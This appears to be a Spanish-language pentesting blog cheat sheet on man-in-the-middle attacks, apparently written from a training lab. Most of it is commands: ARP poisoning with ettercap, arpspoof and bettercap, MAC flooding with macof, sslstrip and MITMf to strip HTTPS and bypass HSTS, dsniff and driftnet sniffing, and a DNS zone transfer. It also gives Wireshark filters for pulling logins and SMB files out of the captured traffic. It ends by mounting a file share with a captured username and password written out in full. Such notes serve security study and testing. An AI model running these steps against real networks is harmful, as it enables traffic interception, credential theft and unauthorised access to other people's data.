---
title: 'MITM'
description: ''
pubDate: 'May 12 2023'
heroImage: '/malware.png'
slug: 'mitm'
---

### ETERCAP

```bash
ettercap -G

# add to target 1: 192.168.10.5
# add to target 2: 192.168.10.1

# select apr poisoning
# Check if poisoning it ios working
arp -a
# before -> attack MAC address is correct
# after -> MAC address is our MAC address (attacker)

# le damos a view->connections para ver el trafico interceptado
# si funciona me cago!!!
```

### CAIN & ABEL

selccionar interface
modo promiscuo
Start/Stop sniffer

### Macof

activar el forwarding

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward

sudo macof -i wlan0 -n 32

# ya interceptamos pero el gateway todavia le envia paquetes a la victima
sudo aprspoof -i wlan0 -t target_ip 192.168.0.1

# para completar el ataque
sudo arpspoof -i wlan0 -t 192.168.0.1 target_ip

# ahora podemos olfatear el trafico con wireshark
echo 1 > /proc/sys/net/ipv4/ip_forward

```

### Bettercap

Primero buscamos nuestros objetivos en la red wifi

```bash
bettercap -I wlan0 --no-spoofing --no-target-nbns

# ponemos el objetivo sino hace spoofing a toda la red

bettercap -I wlan0 -T target_ip

# si queremos especificar otro gateway

bettercap -I wlan0 -G 192.168.0.1 -T target_ip

# permite parsear y listar los paquetes

bettercap -I wlan0 -T target_ip -X -P "HTTPAUTH, URL, FTP, POST"

# FOR MIMT option
bettercap -I tap0 -X -G 10.10.10.15 -t 10.10.10.200
```

### dsniff

interceptamos data

```bash
dsniff -i wlan0
```

### ettercap y sslstrip

```bash

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080

# Iniciamos sslstrip, para que escuche en el 8080
sslstrip -a -f -l 8080 -w file


### con este comando habilitamos sslstrip, si la victima intenta abrir un https lo veremos arriba
bettercap -G gateway -T target_ip --proxy-https
```

### MITM

herramienta moderna para bypass HSTS

```bash
python mitmf.py .i wlan0 --spoof --arp --dns --hsts --gateway gateway_ip --targets target_ip

```

### Poisoning and sniffing

```bash
# metodo 1
arp-scan -I wlan0 192.168.5.0/24

# metodo 2
nmap -PR -sn 192.168.5.*

```

ARP es un protocolo utilizado para la resolución de direcciones de la capa de red (dirección IP) en direcciones de la capa de enlace (dirección MAC). ARP funciona en la Capa 2 del modelo OSI, por lo que sólo se puede utilizar para descubrir hosts que se encuentran en la misma subred.

Como se puede ver en la siguiente captura de pantalla, se enviaron varios paquetes ARP a la dirección Broadcast ff:ff:ff:ff:ff:ff. Sin embargo, sólo se obtuvieron respuestas ARP de hosts vivos: 172.16.5.1, 172.16.5.5, 172.16.5.6 y 172.16.5.10.

#### Usando DNS server

Ya tenemos una lista de hosts activos. Ahora necesitamos consultar cada host activo para identificar qué host está ejecutando el servidor DNS.

El puerto DNS es TCP/53 para transferencia de zona y UDP/53 para consultas DNS. Todo lo que necesitamos hacer es comprobar si hay algún host con el puerto TCP 53 abierto.

El siguiente comando le dice a nmap que utilice un TCP Connect Scan al puerto 53 para los hosts 172.16.5.1, 172.16.5.5, 172.16.5.6, y 172.16.5.10

```bash

nmap -sT -p 53 172.16.5.1,5,6,10

```

<img src="https://res.cloudinary.com/djc1umong/image/upload/v1688150496/5_xcnqp9.webp" alt="wireshark">

_Nota:_ Debe tenerse en cuenta que los escaneos DNS para puertos TCP pueden a veces no coincidir con los puertos reales abiertos en el objetivo, como se ve a veces en el caso en compromisos del mundo real, dependiendo de la conectividad de red, etc. Por lo tanto, asegúrese de ejecutar los escaneos DNS varias veces para asegurarse de que está recogiendo TCP/53 como abierto.

#### Nombre de Dominio

Después de descubrir un par de hosts vivos y también la dirección del Servidor DNS, nuestro siguiente paso es identificar el Nombre de Dominio de la red. Para ello, podemos realizar una búsqueda inversa utilizando nslookup o dig.

```bash

# metodo 1
nslookup

server 192.168.5.7

192.168.5.3

# metodo 2

dig @192.168.5.7 -x 192.168.5.3 +nocookie

# axfr
dig @192.168.5.7 scanme.com -t AXFR +nocookie

```

#### Identificar gateway por defecto

```bash

traceroute 10.10.10.10 -m 5

# or

traceroute 10.10.10.10 -m 5 -T

# or

route
```

_Nota:_ Para poder husmear paquetes usando arpspoof, necesitarás usar la misma puerta de enlace por defecto que usan tus objetivos puedes ver los comandos de arriba.

<img src="https://res.cloudinary.com/djc1umong/image/upload/v1688151233/0_y1wvzh.webp" >

#### Capturar el trafico entre 172.16.5.5 y 172.16.5.1

```bash
# Habilitamos ip_forwarding en nuestro sistema
echo 1 > /proc/sys/net/ipv4/ip_forward

# los dos comandso de abajo al mismo tiempo
arpspoof -i eth1 -t 172.16.5.5 -r 172.16.5.1

arpspoof -i eth1 -t 172.16.5.1 -r 172.16.5.5

```

los comandos de arriba van a mandar paquetes arp hasta envenenar la tabla ARP en ambos hosts.

A continuación, para ver si hay imágenes en el tráfico entre estos hosts, vamos a lanzar driftnet mientras se ejecutan nuestros ataques arspoof.

```bash

driftnet -i eth1

```

Capturamos el tráfico por alrededor de 5m y lo guardamos en un archivo.

#### Capturamos el tráfico entre 172.16.5.6 y 172.16.5.1

```bash
arpspoof -i eth1 -t 172.16.5.6 -r 172.16.5.1

arpspoof -i eth1 -t 172.16.5.1 -r 172.16.5.6

#####

arpspoof -i eth1 -t 172.16.5.6 -r 172.16.5.10

arpspoof -i eth1 -t 172.16.5.10 -r 172.16.5.6

```

#### Análizamos el archivo capturado.

Para tener una visión general del tipo de tráfico que hemos capturado, tenemos que abrir el archivo de captura Task5.pcap y luego desde el menú: _Statistics > Protocol Hierarchy_ para tener una idea de que clase de tráfico estamos viendo.

```bash
#FILTROS WIRESHARK

http and ip.addr == 172.16.5.5

###
http.request.method == "GET"
# follow HTTP Stream

###
http.request.method == "POST"
# follow HTTP Stream

# Repetir el proceso hasta encontrar algo interesante.
http.location == "/login_success.php"

# Recolectar smb

smb.file
# Desde el File menu, seleccionamos Export Objects > SMB
```

En la misma ventana (Follow HTTP Stream), haga clic en el botón llamado Filter Out This stream, para que Wireshark excluya temporalmente esta petición de los paquetes restantes, para que pueda continuar su análisis.

#### Recolectamos las fotos

Manteniendo la captura task6.pcap abierta en Wireshark, vamos a seleccionar en el menú Archivo: _Export Objects > HTTP_

#### Filtro SMB

Probando el acceso a la parte UNC: \\172.16.5.10\finance, podemos usar el comando _mount_.

```bash
# Credenciales recuperadas de los anteriores scans.

mount -t cifs -o user=almir,password=Corinthians2012,rw,vers=1.0 //172.16.5.10/finance /tmp/finance

ls -l /tmp/finance/
```
